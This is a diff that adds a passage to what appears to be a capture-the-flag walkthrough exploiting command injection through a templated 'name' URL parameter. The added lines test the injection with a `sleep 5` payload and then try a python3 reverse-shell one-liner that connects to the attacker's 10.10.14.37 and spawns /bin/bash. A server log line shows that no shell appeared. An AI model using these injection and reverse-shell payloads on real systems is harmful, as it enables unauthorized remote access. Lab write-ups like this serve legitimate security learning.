@@ -115,3 +115,24 @@ Directory listing for /?name=
 ```
 
 So the instruction looks as though it were processed, but we don't know for sure
+
+Let's try a command that we can more easily verify:
+``` 
+http://10.10.14.37/?name=#{'%20`sleep 5`'}
+```
+
+We see the browser sleep for 5 seconds and then post the HTTP response
+- So we know that our commands in this format are working 
+- Let's try to get a reverse shell
+
+When running this as input:
+```
+http://10.10.14.37/?name=#{'%20`python3 -c 'import pty,socket;s=socket.socket();s.connect(("10.10.14.37", 80));pty.spawn("/bin/bash")'`'}
+```
+
+Our session hangs - which is also a good sign! But we're not seeing a shell spawn:
+```
+10.10.11.189 - - [17/Dec/2022 13:48:30] "GET /?name= HTTP/1.1" 200 -
+```
+
+
